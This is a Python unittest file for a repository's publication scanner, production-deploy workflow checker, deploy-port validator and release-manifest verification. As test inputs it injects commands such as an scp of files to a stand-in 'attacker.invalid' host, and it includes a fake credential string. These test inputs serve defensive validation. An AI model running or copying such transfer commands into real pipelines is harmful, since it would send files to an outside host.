from __future__ import annotations

import contextlib
import io
import json
import unittest

from tools.check_public_repo import (
    Entry,
    _content_errors,
    _deployment_workflow_errors,
    _path_errors,
)
from tools.release_manifest import build_manifest, verify_manifest, verify_manifest_identity
from tools.validate_deploy_port import main as validate_deploy_port_main
from tools.validate_deploy_port import normalize_deploy_port


class PublicScannerTest(unittest.TestCase):
    def test_environment_examples_are_exact(self) -> None:
        self.assertNotIn("environment_file_not_allowed", _path_errors(Entry("web/.env.example", b"X=\n")))
        self.assertIn("environment_file_not_allowed", _path_errors(Entry("web/local.env.example", b"X=\n")))

    def test_high_confidence_secret_is_rejected_without_echo(self) -> None:
        value = b"client_" + b'secret="' + b"abcdefghijklmnopqrstuvwx" + b'"\n'
        self.assertIn("credential_pattern_not_allowed", _content_errors(Entry("config.txt", value)))
        placeholder = b'client_secret="placeholder"\n'
        self.assertNotIn("credential_pattern_not_allowed", _content_errors(Entry("config.txt", placeholder)))

    def test_raw_provider_json_is_rejected_but_terms_in_code_are_allowed(self) -> None:
        raw = json.dumps({"raw_response": {"content": "redacted"}}).encode()
        self.assertIn("raw_provider_or_execution_json_not_allowed", _content_errors(Entry("x.json", raw)))
        code = b'field = "provider_response"\n'
        self.assertNotIn("raw_provider_or_execution_json_not_allowed", _content_errors(Entry("x.py", code)))

    def test_unapproved_binary_and_symlink_are_rejected(self) -> None:
        self.assertIn("unapproved_binary_file", _content_errors(Entry("data/blob.bin", b"\x00\xff")))
        self.assertIn("symlink_or_submodule_not_allowed", _path_errors(Entry("x", b"target", "120000")))

    def test_production_deploy_requires_green_main_auto_queue_and_manual_fallback(self) -> None:
        workflow = """
run-name: "production approval for ci-release #${{ github.event.workflow_run.id || inputs.publish_run_id }}"
on:
  workflow_run:
    workflows: ["ci-release"]
    types: [completed]
    branches: [main]
  workflow_dispatch:
    inputs:
      publish_run_id:
        required: true
        type: string
concurrency:
  group: traceable-support-production
  cancel-in-progress: false
jobs:
  deploy:
    if: >-
      github.event_name == 'workflow_dispatch' ||
      (
        github.event_name == 'workflow_run' &&
        github.event.workflow_run.conclusion == 'success' &&
        github.event.workflow_run.event == 'push' &&
        github.event.workflow_run.head_branch == 'main' &&
        github.event.workflow_run.head_repository.full_name == github.repository
      )
    environment: production
    env:
      PUBLISH_RUN_ID: ${{ github.event.workflow_run.id || inputs.publish_run_id }}
      PUBLISH_HEAD_SHA: ${{ github.event.workflow_run.head_sha || '' }}
      PUBLISH_RUN_ATTEMPT: ${{ github.event.workflow_run.run_attempt || '' }}
    steps:
      - name: Check out the trusted deployment controller
        uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803
        with:
          ref: main
          persist-credentials: false
      - name: Stage trusted deployment input validator
        run: install -m 600 tools/validate_deploy_port.py "$RUNNER_TEMP/traceable-validate-deploy-port.py"
      - uses: actions/download-artifact@0000000000000000000000000000000000000000
        with:
          run-id: ${{ env.PUBLISH_RUN_ID }}
      - run: |
          verify_args=(
            --github-run-id "$PUBLISH_RUN_ID"
          )
          if [[ -n "$PUBLISH_HEAD_SHA" ]]; then
            verify_args+=(--git-sha "$PUBLISH_HEAD_SHA")
          fi
          if [[ -n "$PUBLISH_RUN_ATTEMPT" ]]; then
            verify_args+=(--github-run-attempt "$PUBLISH_RUN_ATTEMPT")
          fi
      - name: Check out the manifest commit
        uses: actions/checkout@0000000000000000000000000000000000000000
      - name: Upload and activate with strict host verification
        run: |
          port="$(python "$RUNNER_TEMP/traceable-validate-deploy-port.py" "${DEPLOY_PORT:-22}")" || exit 64
          ssh "$DEPLOY_USER@$DEPLOY_HOST" true
"""
        self.assertEqual(_deployment_workflow_errors(workflow), [])

        required_errors = {
            'run-name: "production approval for ci-release #${{ github.event.workflow_run.id || inputs.publish_run_id }}"': (
                "production_deploy_run_name_missing"
            ),
            "workflow_dispatch:": "production_deploy_manual_fallback_missing",
            "required: true": "production_deploy_manual_input_invalid",
            "workflow_run:": "production_deploy_auto_queue_missing",
            'workflows: ["ci-release"]': "production_deploy_source_workflow_invalid",
            "types: [completed]": "production_deploy_completion_trigger_missing",
            "branches: [main]": "production_deploy_branch_filter_missing",
            "github.event_name == 'workflow_run'": "production_deploy_condition_invalid",
            "github.event.workflow_run.conclusion == 'success'": "production_deploy_condition_invalid",
            "github.event.workflow_run.event == 'push'": "production_deploy_condition_invalid",
            "github.event.workflow_run.head_branch == 'main'": "production_deploy_condition_invalid",
            "github.event.workflow_run.head_repository.full_name == github.repository": (
                "production_deploy_condition_invalid"
            ),
            "environment: production": "production_deploy_environment_gate_missing",
            "PUBLISH_RUN_ID: ${{ github.event.workflow_run.id || inputs.publish_run_id }}": (
                "production_deploy_run_identity_missing"
            ),
            "PUBLISH_HEAD_SHA: ${{ github.event.workflow_run.head_sha || '' }}": (
                "production_deploy_head_identity_missing"
            ),
            "PUBLISH_RUN_ATTEMPT: ${{ github.event.workflow_run.run_attempt || '' }}": (
                "production_deploy_attempt_identity_missing"
            ),
            "run-id: ${{ env.PUBLISH_RUN_ID }}": (
                "production_deploy_artifact_identity_missing"
            ),
            '--github-run-id "$PUBLISH_RUN_ID"': (
                "production_deploy_manifest_run_binding_missing"
            ),
            'verify_args+=(--git-sha "$PUBLISH_HEAD_SHA")': (
                "production_deploy_manifest_sha_binding_missing"
            ),
            'verify_args+=(--github-run-attempt "$PUBLISH_RUN_ATTEMPT")': (
                "production_deploy_manifest_attempt_binding_missing"
            ),
            "- name: Check out the trusted deployment controller": (
                "production_deploy_port_validator_not_trusted"
            ),
            "uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803": (
                "production_deploy_port_validator_not_trusted"
            ),
            "ref: main": "production_deploy_port_validator_not_trusted",
            "persist-credentials: false": "production_deploy_port_validator_not_trusted",
            "- name: Stage trusted deployment input validator": (
                "production_deploy_port_validator_not_trusted"
            ),
            "- name: Check out the manifest commit": (
                "production_deploy_port_validator_not_trusted"
            ),
            (
                'run: install -m 600 tools/validate_deploy_port.py '
                '"$RUNNER_TEMP/traceable-validate-deploy-port.py"'
            ): "production_deploy_port_validator_not_trusted",
            (
                'port="$(python "$RUNNER_TEMP/traceable-validate-deploy-port.py" '
                '"${DEPLOY_PORT:-22}")" || exit 64'
            ): (
                "production_deploy_port_validation_invalid"
            ),
            "group: traceable-support-production": "production_deploy_concurrency_missing",
            "cancel-in-progress: false": "production_deploy_must_not_cancel_in_progress",
        }
        for required, error in required_errors.items():
            with self.subTest(required=required):
                self.assertIn(error, _deployment_workflow_errors(workflow.replace(required, "")))

        comment_only = workflow.replace(
            "  workflow_run:",
            "  # workflow_run:",
        ).replace(
            "    if: >-",
            "    if: github.event_name == 'workflow_dispatch'\n    # if: >-",
        )
        self.assertIn(
            "production_deploy_auto_queue_missing",
            _deployment_workflow_errors(comment_only),
        )
        self.assertIn(
            "production_deploy_condition_invalid",
            _deployment_workflow_errors(comment_only),
        )
        unsafe_port_guard = workflow.replace(
            (
                'port="$(python "$RUNNER_TEMP/traceable-validate-deploy-port.py" '
                '"${DEPLOY_PORT:-22}")" || exit 64'
            ),
            'port="${DEPLOY_PORT:-22}"\n'
            '          [[ "$port" =~ ^[0-9]{1,5}$ ]] && '
            'test "$port" -ge 1 -a "$port" -le 65535',
        )
        self.assertIn(
            "production_deploy_port_validation_invalid",
            _deployment_workflow_errors(unsafe_port_guard),
        )
        validation_line = (
            '          port="$(python "$RUNNER_TEMP/traceable-validate-deploy-port.py" '
            '"${DEPLOY_PORT:-22}")" || exit 64'
        )
        late_validation = workflow.replace(
            validation_line + '\n          ssh "$DEPLOY_USER@$DEPLOY_HOST" true',
            '          ssh "$DEPLOY_USER@$DEPLOY_HOST" true\n' + validation_line,
        )
        self.assertIn(
            "production_deploy_port_validation_invalid",
            _deployment_workflow_errors(late_validation),
        )
        for prefixed_transport in (
            "command ssh attacker.invalid true",
            "timeout 10 ssh attacker.invalid true",
            "env TEST_ONLY=1 scp source attacker.invalid:/tmp/",
        ):
            with self.subTest(prefixed_transport=prefixed_transport):
                transport_before_validation = workflow.replace(
                    validation_line,
                    "          " + prefixed_transport + "\n" + validation_line,
                )
                self.assertIn(
                    "production_deploy_port_validation_invalid",
                    _deployment_workflow_errors(transport_before_validation),
                )
        duplicate_validation = workflow.replace(
            validation_line,
            validation_line + "\n" + validation_line,
        )
        self.assertIn(
            "production_deploy_port_validation_invalid",
            _deployment_workflow_errors(duplicate_validation),
        )
        old_guard_alongside = workflow.replace(
            validation_line,
            validation_line
            + '\n          [[ "$port" =~ ^[0-9]{1,5}$ ]] && '
            'test "$port" -ge 1 -a "$port" -le 65535',
        )
        self.assertIn(
            "production_deploy_port_validation_invalid",
            _deployment_workflow_errors(old_guard_alongside),
        )
        trusted_stage = """
      - name: Stage trusted deployment input validator
        run: install -m 600 tools/validate_deploy_port.py "$RUNNER_TEMP/traceable-validate-deploy-port.py"
"""
        without_trusted_stage = workflow.replace(trusted_stage, "")
        after_manifest_checkout = without_trusted_stage.replace(
            (
                "      - name: Check out the manifest commit\n"
                "        uses: actions/checkout@0000000000000000000000000000000000000000\n"
            ),
            (
                "      - name: Check out the manifest commit\n"
                "        uses: actions/checkout@0000000000000000000000000000000000000000\n"
                + trusted_stage.lstrip("\n")
            ),
        )
        self.assertIn(
            "production_deploy_port_validator_not_trusted",
            _deployment_workflow_errors(after_manifest_checkout),
        )
        untrusted_controller = workflow.replace("          ref: main", "          ref: feature")
        self.assertIn(
            "production_deploy_port_validator_not_trusted",
            _deployment_workflow_errors(untrusted_controller),
        )
        foreign_controller = workflow.replace(
            "        with:\n          ref: main",
            "        with:\n          repository: other/repository\n          ref: main",
            1,
        )
        self.assertIn(
            "production_deploy_port_validator_not_trusted",
            _deployment_workflow_errors(foreign_controller),
        )


class DeployPortValidationTest(unittest.TestCase):
    def test_port_is_ascii_decimal_in_range_and_canonicalized(self) -> None:
        for value, expected in (
            ("1", "1"),
            ("22", "22"),
            ("00022", "22"),
            ("65535", "65535"),
        ):
            with self.subTest(value=value):
                self.assertEqual(normalize_deploy_port(value), expected)

        for value in (
            "",
            "0",
            "65536",
            "22\n",
            "22\r\n",
            " 22",
            "22 ",
            '"22"',
            "+22",
            "22/tcp",
            "２２",
        ):
            with self.subTest(value=repr(value)):
                with self.assertRaisesRegex(ValueError, "^deploy_port_invalid$"):
                    normalize_deploy_port(value)

    def test_cli_fails_closed_without_echoing_invalid_value(self) -> None:
        stdout = io.StringIO()
        stderr = io.StringIO()
        with contextlib.redirect_stdout(stdout), contextlib.redirect_stderr(stderr):
            exit_code = validate_deploy_port_main(["22\n"])
        self.assertEqual(exit_code, 64)
        self.assertEqual(stdout.getvalue(), "")
        self.assertEqual(stderr.getvalue(), "deploy_port_invalid\n")


class ReleaseManifestTest(unittest.TestCase):
    def test_manifest_is_replay_only_and_digest_bound(self) -> None:
        manifest = build_manifest(
            git_sha="a" * 40,
            web_image="ghcr.io/suuny-ab/traceable-support-agent-web@sha256:" + "b" * 64,
            api_image="ghcr.io/suuny-ab/traceable-support-agent-api-replay@sha256:" + "c" * 64,
            built_at="2026-07-23T00:00:00Z",
            github_run_id="1",
            github_run_attempt=1,
        )
        self.assertFalse(manifest["runtime"]["provider_enabled"])
        self.assertEqual(manifest["runtime"]["prompt"]["status"], "not_applicable")
        self.assertEqual(verify_manifest(manifest), manifest)
        self.assertEqual(
            verify_manifest_identity(
                manifest,
                expected_run_id="1",
                expected_git_sha="a" * 40,
                expected_run_attempt=1,
            ),
            manifest,
        )

    def test_deployment_identity_rejects_mismatched_run_sha_or_attempt(self) -> None:
        manifest = build_manifest(
            git_sha="a" * 40,
            web_image="ghcr.io/suuny-ab/traceable-support-agent-web@sha256:" + "b" * 64,
            api_image="ghcr.io/suuny-ab/traceable-support-agent-api-replay@sha256:" + "c" * 64,
            built_at="2026-07-23T00:00:00Z",
            github_run_id="10",
            github_run_attempt=2,
        )
        cases = (
            ({"expected_run_id": "11"}, "release_manifest_run_id_mismatch"),
            (
                {"expected_run_id": "10", "expected_git_sha": "d" * 40},
                "release_manifest_git_sha_mismatch",
            ),
            (
                {"expected_run_id": "10", "expected_run_attempt": 1},
                "release_manifest_attempt_mismatch",
            ),
        )
        for arguments, error in cases:
            with self.subTest(error=error):
                with self.assertRaisesRegex(ValueError, error):
                    verify_manifest_identity(manifest, **arguments)

    def test_moving_tag_is_rejected(self) -> None:
        with self.assertRaisesRegex(ValueError, "web_image_invalid"):
            build_manifest(
                git_sha="a" * 40,
                web_image="ghcr.io/suuny-ab/traceable-support-agent-web:latest",
                api_image="ghcr.io/suuny-ab/traceable-support-agent-api-replay@sha256:" + "c" * 64,
                built_at="2026-07-23T00:00:00Z",
                github_run_id="1",
                github_run_attempt=1,
            )


if __name__ == "__main__":
    unittest.main()
